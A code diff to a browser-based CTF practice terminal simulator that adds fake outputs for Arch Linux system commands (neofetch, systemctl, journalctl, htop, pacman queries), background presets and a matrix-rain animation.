-    const ALL_COMMANDS = ['help','clear','history','env','whoami','id','groups','hostname','pwd','uname','date','exit','quit','solve','challenges','ctf','tutorial','reset-session','ls','cat','echo','touch','rm','mkdir','cp','mv','cd','curl','wget','http','base64','rot13','rot','caesar','vigenere','atbash','decode','encode','hash','sha256sum','sha1sum','md5sum','xxd','hexdump','strings','grep','cut','awk','tr','sort','uniq','wc','sed','find','diff','head','tail','tee','df','ip','ss','ps','python3','python','py','xor','morse','binary','jwt','urldecode','urlencode','htmldecode','htmlencode','charcode','ascii','freq','entropy','brainfuck','timestamp','fromhex','tohex','frombin','tobin','fromoctal','tooctal','rsa','modpow','extgcd','primes','ip2hex','hex2ip','flag','set','unset','nvim','nano','vim','vi','burpsuite','burp', 'whois','dig','nslookup','traceroute','ping','host','sqlmap','ffuf','gobuster','dirb','hydra','john','hashcat','strace','ltrace','gdb','objdump','readelf','nm','file','binwalk','foremost','steghide','exiftool','zsteg','stegsolve','openssl','gpg','keytool','nc','netcat','nmap','masscan','top','kill','jobs','bg','fg','man','apropos','which','type','neofetch','lolcat','cowsay','figlet','zip','unzip','tar','gzip','bzip2','pacman','systemctl'];
+    const ALL_COMMANDS = ['help','clear','history','env','whoami','id','groups','hostname','pwd','uname','date','exit','quit','solve','challenges','ctf','tutorial','reset-session','ls','cat','echo','touch','rm','mkdir','cp','mv','cd','curl','wget','http','base64','rot13','rot','caesar','vigenere','atbash','decode','encode','hash','sha256sum','sha1sum','md5sum','xxd','hexdump','strings','grep','cut','awk','tr','sort','uniq','wc','sed','find','diff','head','tail','tee','df','ip','ss','ps','python3','python','py','xor','morse','binary','jwt','urldecode','urlencode','htmldecode','htmlencode','charcode','ascii','freq','entropy','brainfuck','timestamp','fromhex','tohex','frombin','tobin','fromoctal','tooctal','rsa','modpow','extgcd','primes','ip2hex','hex2ip','flag','set','unset','nvim','nano','vim','vi','burpsuite','burp', 'whois','dig','nslookup','traceroute','ping','host','sqlmap','ffuf','gobuster','dirb','hydra','john','hashcat','strace','ltrace','gdb','objdump','readelf','nm','file','binwalk','foremost','steghide','exiftool','zsteg','stegsolve','openssl','gpg','keytool','nc','netcat','nmap','masscan','top','kill','jobs','bg','fg','man','apropos','which','type','neofetch','fastfetch','screenfetch','inxi','journalctl','htop','uptime','paru','yay','lolcat','cowsay','figlet','zip','unzip','tar','gzip','bzip2','pacman','systemctl'];
 
     function resolvePath(path) {
         if (!path) return CWD;
@@ -903,9 +1214,9 @@
             } else {
                 const xFiles = Object.keys(VFILES).filter(k => !Object.keys(_VFILES_DEFAULT).includes(k)).length;
                 if (xFiles > 0) term.writeln('\x1b[35m[SESSION RESTORED]\x1b[0m \x1b[90mWelcome back — ' + xFiles + ' custom file(s) loaded.\x1b[0m');
-                term.write(PROMPT);
+                term.write(getPrompt());
             }
-        } catch (err) { console.error('[BOOT ERROR]', err); term.write(PROMPT); }
+        } catch (err) { console.error('[BOOT ERROR]', err); term.write(getPrompt()); }
     })();
 
     // ── 5. INPUT & INTERACTION HANDLERS ──
@@ -1132,7 +1443,13 @@
                 case 'groups':    pl('entity wheel docker'); break;
                 case 'hostname':  pl('archlinux'); break;
                 case 'pwd':       pl(CWD); break;
-                case 'uname':     pl(parts.includes('-a') ? 'Linux archlinux 6.8.0-arch1-1 #1 SMP PREEMPT_DYNAMIC Wed, 15 Mar 2026 12:00:00 +0000 x86_64 GNU/Linux' : 'Linux'); break;
+                case 'uname':     {
+                    if (parts.includes('-a')) pl(`Linux archlinux ${ARCH_KERNEL} #1 SMP PREEMPT_DYNAMIC Fri, 11 Apr 2026 08:00:00 +0000 x86_64 GNU/Linux`);
+                    else if (parts.includes('-r')) pl(ARCH_KERNEL);
+                    else if (parts.includes('-n')) pl('archlinux');
+                    else pl('Linux');
+                    break;
+                }
                 case 'date':      pl(new Date().toString()); break;
                 case 'echo':      {
                     const raw2 = raw.replace(/^echo\s+/,'');
@@ -1307,8 +1624,9 @@
                 case 'nano':      termNano(parts); break;
 
                 // ── Recon / Network ──
-                case 'neofetch':  termNeofetch(); break;
-                case 'set':       termSet(parts); break;
+                case 'neofetch':
+                case 'fastfetch':
+                case 'screenfetch': termNeofetch(cmd); break;
                 case 'whois':     await termWhois(parts); break;
                 case 'ping':      termPing(parts); break;
                 case 'traceroute':termTraceroute(parts); break;
@@ -1327,7 +1645,13 @@
                 case 'stegsolve': termSteg(cmd, parts); break;
                 case 'exiftool':  termExif(parts); break;
                 case 'pacman':    await termPacman(parts); break;
-                case 'systemctl': pl('\x1b[90mUNIT               LOAD   ACTIVE SUB     DESCRIPTION\x1b[0m\n\x1b[32mnetworking.service loaded active running Network Configuration\x1b[0m\n\x1b[32msshd.service       loaded active running OpenSSH Daemon\x1b[0m'); break;
+                case 'systemctl': termSystemctl(parts); break;
+                case 'journalctl': termJournalctl(parts); break;
+                case 'inxi':      termInxi(parts); break;
+                case 'htop':      termHtop(); break;
+                case 'uptime':    termUptime(); break;
+                case 'paru':
+                case 'yay':       termAurHelper(cmd, parts); break;
                 case 'msfconsole':
                 case 'msf':       termMsf(parts); break;
                 case 'exit':
@@ -2000,6 +2324,8 @@
             '  \x1b[36mls\x1b[0m -l   \x1b[36mcd\x1b[0m   \x1b[36mpwd\x1b[0m   \x1b[36mtouch\x1b[0m   \x1b[36mrm\x1b[0m   \x1b[36mmkdir\x1b[0m   \x1b[36mcp\x1b[0m   \x1b[36mmv\x1b[0m',
             '  \x1b[36mgrep\x1b[0m   \x1b[36msed\x1b[0m   \x1b[36mawk\x1b[0m   \x1b[36mfind\x1b[0m   \x1b[36mhead\x1b[0m   \x1b[36mtail\x1b[0m   \x1b[36mtee\x1b[0m   \x1b[36mwc\x1b[0m',
             '  \x1b[36mps\x1b[0m   \x1b[36mip\x1b[0m a   \x1b[36mss\x1b[0m   \x1b[36mgroups\x1b[0m   \x1b[36mdiff\x1b[0m   \x1b[36mmd5sum\x1b[0m   \x1b[36mdf\x1b[0m   \x1b[36mtar\x1b[0m',
+            '  \x1b[36mneofetch\x1b[0m · \x1b[36mfastfetch\x1b[0m · \x1b[36mscreenfetch\x1b[0m   \x1b[36mpacman\x1b[0m -Q / -Qi / -Ss / -Syu',
+            '  \x1b[36msystemctl\x1b[0m · \x1b[36mjournalctl\x1b[0m -b   \x1b[36minxi\x1b[0m   \x1b[36mhtop\x1b[0m   \x1b[36muptime\x1b[0m   \x1b[36mparu\x1b[0m/\x1b[36myay\x1b[0m (AUR sim)',
             '  Pipes \x1b[36m|\x1b[0m  redirect \x1b[36m>\x1b[0m / \x1b[36m>>\x1b[0m  stdin \x1b[36m<\x1b[0m file   vars \x1b[36mVAR=val\x1b[0m  expand \x1b[36m\$PATH\x1b[0m',
             '',
             '\x1b[33m── CTF & SYSTEM ──────────────────────────────────────────────\x1b[0m',
@@ -2187,7 +2513,7 @@
         }
         
         pl(`\x1b[34m[VALIDATION]\x1b[0m Checking objective for module: \x1b[1m${modId}\x1b[0m...`);
-        const success = challenge.validator(VFILES, CWD);
+        const { ok: success, hint } = runChallengeValidator(modId);
         
         if (success) {
             pl('\x1b[32m' + '═'.repeat(45) + '\x1b[0m');
@@ -2197,7 +2523,7 @@
             window.parent.postMessage({ type: 'CHALLENGE_SUCCESS', modId }, '*');
         } else {
             pe('\x1b[31m[!] Objective not met yet.\x1b[0m');
-            if (challenge.hint) pl(`\x1b[33m💡 HINT:\x1b[0m ${challenge.hint}`);
+            if (hint) pl(`\x1b[33m💡 HINT:\x1b[0m ${hint}`);
         }
     }
 
@@ -2242,17 +2568,156 @@
         pl(' 2  core.net (10.0.0.1)  8.4 ms');
         pl(`\x1b[33mTip:\x1b[0m Raw ICMP is limited in the browser; this is a BXF simulation.`);
     }
-    function termNeofetch() {
-        pl(`\x1b[35m                   .\x1b[0m         \x1b[1m\x1b[35mentity\x1b[90m@\x1b[34marchlinux\x1b[0m`);
-        pl(`\x1b[35m                  / \\\x1b[0m        \x1b[90m─────────────────────────────\x1b[0m`);
-        pl(`\x1b[35m                 /   \\\x1b[0m       \x1b[34mOS:\x1b[0m       Arch Linux (BXF CTF Terminal)`);
-        pl(`\x1b[35m                / ,'  \\\x1b[0m      \x1b[34mKernel:\x1b[0m   6.8.0-arch1-1`);
-        pl(`\x1b[35m               / (____) \\\x1b[0m   \x1b[34mShell:\x1b[0m    zsh 5.9 (browser)`);
-        pl(`\x1b[35m              /___________\\\x1b[0m  \x1b[34mTerminal:\x1b[0m Kitty / xterm.js 5.3.0`);
-        pl(`                              \x1b[34mTheme:\x1b[0m    \x1b[35mCatppuccin Mocha\x1b[0m`);
-        pl(`                              \x1b[34mFont:\x1b[0m     Share Tech Mono 14px`);
-        pl(`                              \x1b[34mTools:\x1b[0m    80+ CTF tools`);
-        pl(`                              \x1b[34mColors:\x1b[0m   \x1b[31m■\x1b[0m \x1b[33m■\x1b[0m \x1b[32m■\x1b[0m \x1b[36m■\x1b[0m \x1b[34m■\x1b[0m \x1b[35m■\x1b[0m`);
+    function termNeofetch(mode) {
+        const m = (mode || 'neofetch').toLowerCase();
+        const title = m === 'screenfetch' ? '\x1b[33mscreenfetch\x1b[0m \x1b[90m2.3.0 (BXF fork)\x1b[0m'
+            : m === 'fastfetch' ? '\x1b[1mfastfetch\x1b[0m \x1b[90m--logo arch\x1b[0m'
+            : '\x1b[1mneofetch\x1b[0m \x1b[90m7.1.0\x1b[0m';
+        const full = [
+            ['\x1b[36m                  -`\x1b[0m', ''],
+            ['\x1b[36m                 .o+`\x1b[0m', title],
+            ['\x1b[36m                `ooo/\x1b[0m', '\x1b[1m\x1b[38;5;141mentity\x1b[90m@\x1b[38;5;75marchlinux\x1b[0m'],
+            ['\x1b[36m               `+oooo:\x1b[0m', '\x1b[90m──────────────────────────────\x1b[0m'],
+            ['\x1b[36m              `+oooooo:\x1b[0m', '\x1b[34mOS\x1b[0m: Arch Linux \x1b[90m+\x1b[0m BXF overlay \x1b[90m(rolling)\x1b[0m'],
+            ['\x1b[36m              -+oooooo+:\x1b[0m', '\x1b[34mHost\x1b[0m: archlinux \x1b[90m(x86_64)\x1b[0m'],
+            ['\x1b[36m            `/:-:++oooo+:\x1b[0m', '\x1b[34mKernel\x1b[0m: ' + ARCH_KERNEL],
+            ['\x1b[36m           `/++++/+++++++:\x1b[0m', '\x1b[34mUptime\x1b[0m: \x1b[32m42 days, 6 hours\x1b[0m'],
+            ['\x1b[36m          `/++++++++++++++:\x1b[0m', '\x1b[34mPackages\x1b[0m: \x1b[33m1847\x1b[0m \x1b[90m(pacman)\x1b[0m'],
+            ['\x1b[36m         `/+++oooooooooooo/`\x1b[0m', '\x1b[34mShell\x1b[0m: zsh 5.9'],
+            ['\x1b[36m        ./ooosssso++osssssso+`\x1b[0m', '\x1b[34mDisplay\x1b[0m: 1920x1080 @ 144Hz \x1b[90m(fake)\x1b[0m'],
+            ['\x1b[36m       .oossssssssssosssssssso`\x1b[0m', '\x1b[34mWM\x1b[0m: Hyprland'],
+            ['\x1b[36m      :ssssssssssssssssssssssss`\x1b[0m', '\x1b[34mTerminal\x1b[0m: kitty / \x1b[35mxterm.js\x1b[0m'],
+            ['\x1b[36m     :ssssssssssssssssssssssssss`\x1b[0m', '\x1b[34mCPU\x1b[0m: AMD Ryzen 9 \x1b[90m(simulated load)\x1b[0m'],
+            ['\x1b[36m    /ssssssssssssssssssssssssssss`\x1b[0m', '\x1b[34mGPU\x1b[0m: WebGL \x1b[90m— tu GPU real sigue en el host\x1b[0m'],
+            ['\x1b[36m   /ssssssssssssssssssssssssssssss`\x1b[0m', '\x1b[34mMemory\x1b[0m: \x1b[33m3.1 GiB\x1b[0m / \x1b[90m16 GiB\x1b[0m'],
+            ['\x1b[36m  /ssssssssssssssssssssssssssssssss`\x1b[0m', '\x1b[34mLocale\x1b[0m: ' + (navigator.language || 'en_US') + '.UTF-8'],
+            ['\x1b[36m /ssssssssssssssssssssssssssssssssss`\x1b[0m', '\x1b[34mTheme\x1b[0m: Catppuccin Mocha'],
+            ['\x1b[36m/ssssssssssssssssssssssssssssssssssss`\x1b[0m', '\x1b[34mColors\x1b[0m: \x1b[31m■\x1b[0m \x1b[33m■\x1b[0m \x1b[32m■\x1b[0m \x1b[36m■\x1b[0m \x1b[34m■\x1b[0m \x1b[35m■\x1b[0m'],
+        ];
+        const compact = [
+            ['\x1b[36m              -+oooooo+:\x1b[0m', title],
+            ['\x1b[36m            `/:-:++oooo+:\x1b[0m', '\x1b[1m\x1b[38;5;141mentity\x1b[90m@\x1b[38;5;75marchlinux\x1b[0m'],
+            ['\x1b[36m           `/++++/+++++++:\x1b[0m', '\x1b[34mOS\x1b[0m Arch · \x1b[34mKernel\x1b[0m ' + ARCH_KERNEL],
+            ['\x1b[36m          `/++++++++++++++:\x1b[0m', '\x1b[34mWM\x1b[0m Hyprland · \x1b[34mShell\x1b[0m zsh'],
+            ['\x1b[36m         `/+++oooooooooooo/`\x1b[0m', '\x1b[34mPkgs\x1b[0m 1847 · \x1b[34mTerm\x1b[0m kitty/xterm.js'],
+            ['\x1b[36m        ./ooosssso++osssssso+`\x1b[0m', '\x1b[34mTheme\x1b[0m Catppuccin · \x1b[34mUp\x1b[0m 42d'],
+            ['\x1b[36m/ssssssssssssssssssssssssssssssssssss`\x1b[0m', '\x1b[34mColors\x1b[0m \x1b[31m■\x1b[0m\x1b[33m■\x1b[0m\x1b[32m■\x1b[0m\x1b[36m■\x1b[0m\x1b[34m■\x1b[0m\x1b[35m■\x1b[0m'],
+        ];
+        const logo = m === 'fastfetch' ? compact : full;
+        const colW = 36;
+        logo.forEach(([L, R]) => {
+            const strip = L.replace(/\x1b\[[0-9;]*m/g, '');
+            const gap = ' '.repeat(Math.max(2, colW - strip.length));
+            pl(L + gap + R);
+        });
+        pl('');
+        pl('\x1b[90mTip:\x1b[0m simulación en el navegador — \x1b[36mcat /etc/os-release\x1b[0m · \x1b[36mpacman -Q\x1b[0m · \x1b[36mjournalctl -b\x1b[0m');
+    }
+
+    function termSystemctl(parts) {
+        const sub = (parts[1] || '').toLowerCase();
+        const u = parts.slice(2).join(' ').trim();
+        if (sub === 'status') {
+            if (!u) {
+                pl(`\x1b[1m●\x1b[0m ctf-lab.service - BXF CTF browser session`);
+                pl(`   Loaded: loaded (/usr/lib/systemd/system/ctf-lab.service; enabled; preset: enabled)`);
+                pl(`   Active: \x1b[32mactive (running)\x1b[0m since boot`);
+                pl(`   Tasks: 42 (limit: 38469)`);
+                pl(`   Memory: 512.0M`);
+                return;
+            }
+            if (u.includes('sshd')) {
+                pl(`\x1b[1m●\x1b[0m sshd.service - OpenSSH Daemon`);
+                pl(`   Loaded: loaded (/usr/lib/systemd/system/sshd.service; enabled; preset: enabled)`);
+                pl(`   Active: \x1b[32mactive (running)\x1b[0m since Thu 2026-04-10 09:00:00 UTC; 1 week ago`);
+                pl(`   Tasks: 1 (limit: 38469)`);
+                pl(`   CGroup: /system.slice/sshd.service`);
+                pl(`           └─1234 "sshd: /usr/bin/sshd -D [listener] 0 of 10-100 startups"`);
+                return;
+            }
+            pe(`Unit ${u} not found.`);
+            return;
+        }
+        if (sub === 'list-units' || sub === '') {
+            pl('\x1b[90mUNIT                          LOAD   ACTIVE SUB     DESCRIPTION\x1b[0m');
+            pl('\x1b[32mctf-lab.slice                 loaded active active  BXF browser session\x1b[0m');
+            pl('\x1b[32msys-network.service           loaded active exited  Network is up\x1b[0m');
+            pl('\x1b[32msshd.service                  loaded active running OpenSSH Daemon\x1b[0m');
+            pl('\x1b[32mpipewire.service              loaded active running PipeWire Multimedia Service\x1b[0m');
+            pl('\x1b[32mhyprland-session.target       loaded active active  Hyprland Wayland session\x1b[0m');
+            pl('\x1b[32mdocker.service                loaded active running Docker Application Container Engine\x1b[0m');
+            pl('\x1b[90m…\x1b[0m');
+            return;
+        }
+        pl('\x1b[90mUNIT               LOAD   ACTIVE SUB     DESCRIPTION\x1b[0m');
+        pl('\x1b[32mnetworking.service loaded active running Network Configuration\x1b[0m');
+        pl('\x1b[32msshd.service       loaded active running OpenSSH Daemon\x1b[0m');
+    }
+
+    function termJournalctl(parts) {
+        const boot = parts.includes('-b') || parts.includes('--boot');
+        pl('\x1b[90m-- Journal begins at Thu 2026-04-10 08:41:02 UTC, ends at ' + new Date().toISOString().replace('T', ' ').slice(0, 19) + ' UTC --\x1b[0m');
+        const lines = boot ? [
+            'Apr 10 08:41:02 archlinux kernel: Linux version ' + ARCH_KERNEL,
+            'Apr 10 08:41:03 archlinux systemd[1]: Started BXF CTF user session.',
+            'Apr 10 08:41:04 archlinux hyprland[884]: Hyprland v0.42.0',
+            'Apr 10 08:41:05 archlinux NetworkManager[900]: connectivity: full',
+            'Apr 11 02:17:41 archlinux sudo[1204]: entity : TTY=pts/0 ; PWD=/home/entity/ctf ; USER=root ; COMMAND=/usr/bin/pacman -Syu',
+            'Apr 17 00:00:00 archlinux pacman[9999]: synchronizing package lists…',
+        ] : [
+            new Date().toISOString().slice(0, 19).replace('T', ' ') + ' archlinux chromium[bx]: sandbox: JS VM online',
+        ];
+        lines.forEach(l => pl(l));
+    }
+
+    function termInxi(parts) {
+        const full = parts.includes('-Fxxx') || parts.includes('-b');
+        pl('\x1b[1mSystem:\x1b[0m');
+        pl('  Host: archlinux Kernel: ' + ARCH_KERNEL + ' arch: x86_64 bits: 64 compiler: gcc 14.2.1');
+        pl('  Desktop: Hyprland v0.42.0 Distro: Arch Linux');
+        if (full) {
+            pl('\x1b[1mMachine:\x1b[0m');
+            pl('  Type: BXF-VM System: product: CTF-LAB v: 1');
+            pl('\x1b[1mCPU:\x1b[0m');
+            pl('  Info: simulated load average: ' + (3 + Math.random() * 2).toFixed(2));
+        }
+        pl('\x1b[1mNetwork:\x1b[0m');
+        pl('  Device-1: wlan0 driver: iwlwifi state: managed ip: 192.168.1.' + (40 + Math.floor(Math.random() * 20)));
+    }
+
+    function termHtop() {
+        pl('\x1b[30m\x1b[42m  PID USER      PRI NI VIRT   RES   SHR S  CPU% MEM%   TIME+  COMMAND        \x1b[0m');
+        const rows = [
+            [1, 'root', '20', '0', '168M', '12M', '8M', 'S', '0.0', '0.1', '0:02.11', 'systemd'],
+            [884, 'entity', '20', '0', '2.1G', '180M', '96M', 'S', (2 + Math.random() * 8).toFixed(1), '1.2', '12:44.02', 'Hyprland'],
+            [1200, 'entity', '20', '0', '890M', '210M', '64M', 'S', (5 + Math.random() * 25).toFixed(1), '1.8', '3:22.90', 'kitty'],
+            [9001, 'entity', '20', '0', '512M', '96M', '48M', 'R', (15 + Math.random() * 40).toFixed(1), '0.9', '0:00.' + String(Math.floor(Math.random() * 99)).padStart(2, '0'), 'neofetch'],
+            [1337, 'nobody', '20', '0', '32M', '4M', '2M', 'S', '0.0', '0.0', '0:00.00', 'browser-sandbox'],
+        ];
+        rows.forEach(([pid, user, pri, ni, virt, res, shr, st, cpu, mem, tim, cmd]) => {
+            pl(`${String(pid).padEnd(5)} ${user.padEnd(9)} ${pri.padStart(2)} ${ni.padStart(2)} ${virt.padStart(5)} ${res.padStart(5)} ${shr.padStart(4)} ${st} ${cpu.padStart(5)} ${mem.padStart(4)} ${tim.padStart(7)}  \x1b[36m${cmd}\x1b[0m`);
+        });
+        pl('\x1b[90mF1Help F2Setup F3Search F4Filter F5Tree F6SortBy F7Nice- F8Nice+ F9Kill F10Quit\x1b[0m');
+    }
+
+    function termUptime() {
+        pl(` \x1b[32m08:41:02 up 42 days,  6:17,  3 users,  load average: ${(0.4 + Math.random() * 0.4).toFixed(2)}, ${(0.5 + Math.random() * 0.3).toFixed(2)}, ${(0.45 + Math.random() * 0.35).toFixed(2)}`);
+    }
+
+    function termAurHelper(name, parts) {
+        const sub = parts[1];
+        const pkg = parts[2] || 'ctf-utils';
+        if (sub === '-S' || sub === '--sync') {
+            pl(`\x1b[36m::\x1b[0m \x1b[1mResolving dependencies...\x1b[0m`);
+            pl(`\x1b[33mAUR\x1b[0m dependency chain: \x1b[32m${pkg}\x1b[0m → \x1b[90mbase-devel git\x1b[0m`);
+            pl(`\x1b[32m==>\x1b[0m Making package: ${pkg} 1.0.0-1 (${new Date().toISOString().slice(0, 10)})`);
+            pl(`\x1b[32m==>\x1b[0m Connecting to AUR API... \x1b[90m(browser sandbox: pretend it worked)\x1b[0m`);
+            pl(`\x1b[32m==>\x1b[0m \x1b[1mPackage built and installed.\x1b[0m Now go solve a real challenge.`);
+            return;
+        }
+        pl(`\x1b[1m${name}\x1b[0m v12.4.0 — AUR helper (sim)`);
+        pl(`Usage: ${name} \x1b[33m-S\x1b[0m <pkg>   Install from AUR`);
+        pl(`       ${name} \x1b[33m-Syu\x1b[0m       Full upgrade (repos + AUR)`);
     }
 
     function termClear() { term.write('\x1b[2J\x1b[H'); term.write(getPrompt()); }
@@ -2260,6 +2725,41 @@
     // ── Pentest Tools & Arch Flavor ──
     async function termPacman(parts) {
         const sub = parts[1];
+        const _fakePkgs = ['linux', 'pacman', 'systemd', 'hyprland', 'kitty', 'firefox', 'docker', 'vim', 'sudo', 'openssh', 'nftables', 'pipewire', 'mesa', 'nodejs', 'python', 'base-devel', 'ctf-utils'];
+        if (sub === '-Q' || sub === '-Qe') {
+            _fakePkgs.forEach((p, i) => pl(`\x1b[36m${p}\x1b[0m \x1b[90m${1 + i}.0-1\x1b[0m`));
+            pl(`\x1b[90m… and ~${1820 + Math.floor(Math.random() * 40)} more lines (pacman -Q | wc -l → 1847)\x1b[0m`);
+            return;
+        }
+        if (sub === '-Qi') {
+            const pkg = parts[2] || 'pacman';
+            pl(`Name            : ${pkg}`);
+            pl(`Version         : 6.1.0-1`);
+            pl(`Description     : BXF simulated package metadata`);
+            pl(`Architecture    : x86_64`);
+            pl(`Installed Size  : ${(Math.floor(Math.random() * 40) + 2)}.43 MiB`);
+            pl(`Build Date      : Wed 09 Apr 2026 04:20:00 PM UTC`);
+            pl(`Install Date    : Thu 10 Apr 2026 08:41:05 AM UTC`);
+            pl(`Install Reason  : Explicitly installed`);
+            pl(`Install Script  : No`);
+            pl(`Validated By    : SHA-256 Sum  Signature`);
+            return;
+        }
+        if (sub === '-Ss') {
+            const q = (parts[2] || 'ctf').toLowerCase();
+            pl(`\x1b[90mextra/\x1b[0m\x1b[36m${q}-tools\x1b[0m 1337.0-1`);
+            pl(`    Meta package for ${q} workflows (simulated).`);
+            pl(`\x1b[90mcommunity/\x1b[0m\x1b[36mbxf-${q}\x1b[0m 0.1.0-1`);
+            pl(`    Breaker_X_Fixer overlay hooks.`);
+            return;
+        }
+        if (sub === '-R' || sub === '-Rs') {
+            const pkg = parts[2] || '';
+            if (!pkg) { pe('error: no targets specified'); return; }
+            pl(`checking dependencies...`);
+            pl(`\x1b[32m[+] ${pkg}\x1b[0m removed — \x1b[90m(only in fiction; refresh changes nothing)\x1b[0m`);
+            return;
+        }
         if (sub === '-S' || sub === 'install') {
             const pkg = parts[2]; if (!pkg) { pe('error: no targets specified (use -h for help)'); return; }
             pl(`resolving dependencies...`); await sleep(400);
@@ -2279,7 +2779,7 @@
             pl(` core is up to date`); pl(` extra is up to date`); pl(` community is up to date`);
             pl(`:: Starting full system upgrade...`);
             pl(` there is nothing to do`);
-        } else pe('usage: pacman <operation> [...]\noperations:\n pacman {-S --sync} [options] [package(s)]\n pacman {-U --upgrade} [options] [file(s)]');
+        } else pe('usage: pacman <operation> [...]\noperations:\n pacman {-S --sync} [options] [package(s)]\n pacman {-Q --query}   pacman {-Qi} <pkg>\n pacman {-Ss} <regex>   pacman {-Syu}');
     }
 
     async function termNmap(parts) {
@@ -2431,6 +2931,7 @@
         const activeId = 'preset-' + (stored.preset || 'death');
         const el = document.getElementById(activeId);
         if (el) el.classList.add('active');
+        window.dispatchEvent(new CustomEvent('bxf-bg-preset', { detail: stored.preset || 'death' }));
     }
     function toggleBgMenu() {
         document.getElementById('bg-menu').classList.toggle('open');
@@ -2439,6 +2940,8 @@
         const map = {
             death:  "url('images/Death_.jpg')",
             nebula: "radial-gradient(ellipse at 30% 60%,rgba(203,166,247,0.45),rgba(137,180,250,0.2),#11111b)",
+            arch:   "linear-gradient(165deg,#062535 0%,#0c0c12 42%,#1793d1 160%)",
+            matrix: "radial-gradient(ellipse at 50% 120%,rgba(0,80,40,0.35),#020805 55%)",
             none:   "none",
         };
         const url = map[preset] || map.death;
@@ -2450,6 +2953,7 @@
         stored.preset = preset;
         stored.url    = url;
         localStorage.setItem('bxf_bg', JSON.stringify(stored));
+        window.dispatchEvent(new CustomEvent('bxf-bg-preset', { detail: preset }));
     }
     function setBgOpacity(val) {
         document.documentElement.style.setProperty('--terminal-bg-opacity', val/100);
@@ -2475,6 +2979,7 @@
                 const stored = { preset: 'custom', url, opacity: parseInt(document.getElementById('bg-opacity').value) };
                 localStorage.setItem('bxf_bg', JSON.stringify(stored));
                 document.querySelectorAll('.bg-preset').forEach(p => p.classList.remove('active'));
+                window.dispatchEvent(new CustomEvent('bxf-bg-preset', { detail: 'custom' }));
                 term.writeln('\\x1b[32m[+] Custom background applied and saved.\\x1b[0m');
             } catch (err) {
                 term.writeln('\\x1b[31m[!] Error saving to localStorage: Image might be too heavy.\\x1b[0m');
@@ -2673,9 +3178,10 @@
             }, 1000);
         }
 
-        // [NEW] Handle Auto-Edit for Programming Challenges
+        // [NEW] Handle Auto-Edit for Programming Challenges (skipped when Learn provides the script editor)
         const autoEdit = urlParams.get('autoedit');
-        if (autoEdit) {
+        const learnEditor = urlParams.get('learnEditor') === '1';
+        if (autoEdit && !learnEditor) {
             setTimeout(async () => {
                 // Virtual Enter to clear prompt
                 term.write('\r\n');
@@ -2688,11 +3194,66 @@
 
     setInterval(()=>{const e=document.getElementById('status-time');if(e)e.textContent=new Date().toLocaleTimeString();},1000);
 
-    // ── Nebula Canvas Animation ──
+    (function hyprArchMetrics() {
+        const sk = document.getElementById('status-kernel-str');
+        const tk = document.getElementById('topbar-kernel');
+        const kFull = 'Linux archlinux ' + ARCH_KERNEL + ' x86_64';
+        if (sk) sk.textContent = kFull;
+        if (tk) tk.textContent = ARCH_KERNEL;
+
+        let cpu = 8 + Math.random() * 5;
+        let mem = 22 + Math.random() * 10;
+        let upd = Math.floor(Math.random() * 2);
+
+        function tickMetrics() {
+            cpu = Math.min(94, Math.max(4, cpu + (Math.random() - 0.5) * 8));
+            mem = Math.min(91, Math.max(16, mem + (Math.random() - 0.5) * 5));
+            const cEl = document.getElementById('metric-cpu-pct');
+            const cBar = document.getElementById('metric-cpu-bar');
+            const mEl = document.getElementById('metric-mem-pct');
+            const mBar = document.getElementById('metric-mem-bar');
+            const uEl = document.getElementById('metric-updates');
+            if (cEl) cEl.textContent = String(Math.round(cpu));
+            if (cBar) cBar.style.width = Math.round(cpu) + '%';
+            if (mEl) mEl.textContent = String(Math.round(mem));
+            if (mBar) mBar.style.width = Math.round(mem) + '%';
+            if (uEl && Math.random() < 0.06) {
+                upd = Math.min(12, upd + (Math.random() < 0.5 ? 0 : 1));
+                uEl.textContent = String(upd);
+            }
+        }
+        setInterval(tickMetrics, 1500);
+        tickMetrics();
+
+        const wrap = document.getElementById('hypr-workspaces');
+        if (wrap) {
+            wrap.querySelectorAll('.hypr-ws').forEach((el) => {
+                el.addEventListener('click', () => {
+                    wrap.querySelectorAll('.hypr-ws').forEach(w => w.classList.remove('active'));
+                    el.classList.add('active');
+                });
+            });
+            let ws = 1;
+            setInterval(() => {
+                ws = (ws % 5) + 1;
+                const btn = wrap.querySelector('[data-ws="' + ws + '"]');
+                if (btn) {
+                    wrap.querySelectorAll('.hypr-ws').forEach(w => w.classList.remove('active'));
+                    btn.classList.add('active');
+                }
+            }, 22000);
+        }
+    })();
+
+    // ── Nebula / Matrix canvas (preset: matrix → lluvia verde) ──
     (function() {
         const canvas = document.getElementById('bg-canvas');
         if (!canvas) return;
         const ctx = canvas.getContext('2d');
+        function getPreset() {
+            try { return JSON.parse(localStorage.getItem('bxf_bg') || '{}').preset || 'death'; } catch (e) { return 'death'; }
+        }
+        let mode = getPreset() === 'matrix' ? 'matrix' : 'nebula';
 
         function resize() {
             canvas.width  = window.innerWidth;
@@ -2700,8 +3261,10 @@
         }
         resize();
         window.addEventListener('resize', resize);
+        window.addEventListener('bxf-bg-preset', (ev) => {
+            mode = ev.detail === 'matrix' ? 'matrix' : 'nebula';
+        });
 
-        // Star particles
         const COLORS = ['#cba6f7','#89b4fa','#89dceb','#a6e3a1','#f5c2e7'];
         const stars = Array.from({length: 160}, () => ({
             x: Math.random() * window.innerWidth,
@@ -2715,7 +3278,6 @@
             color: COLORS[Math.floor(Math.random() * COLORS.length)],
         }));
 
-        // Nebula orbs
         const orbs = [
             { cx: 0.18, cy: 0.28, r: 0.38, color: '203,166,247', speed: 0.0004 },
             { cx: 0.82, cy: 0.72, r: 0.32, color: '137,180,250', speed: 0.0003 },
@@ -2723,17 +3285,52 @@
             { cx: 0.30, cy: 0.78, r: 0.25, color: '166,227,161', speed: 0.00035 },
         ];
 
+        const glyphs = 'ｱｲｳｴｵｶｷｸｹｺｻｼｽｾｿﾀﾁﾂ0123456789ABCDEF#$_';
+        let columns = [];
+        function initMatrix() {
+            const W = canvas.width, H = canvas.height;
+            const colW = 14;
+            const n = Math.ceil(W / colW) + 2;
+            columns = Array.from({ length: n }, (_, i) => ({
+                x: i * colW,
+                y: Math.random() * H,
+                speed: 0.8 + Math.random() * 2.2,
+                len: 8 + Math.floor(Math.random() * 18),
+            }));
+        }
+        initMatrix();
+        window.addEventListener('resize', initMatrix);
+
         let t = 0;
         function draw() {
             t++;
             const W = canvas.width, H = canvas.height;
+
+            if (mode === 'matrix') {
+                ctx.fillStyle = 'rgba(2, 8, 5, 0.12)';
+                ctx.fillRect(0, 0, W, H);
+                ctx.font = '12px Share Tech Mono, monospace';
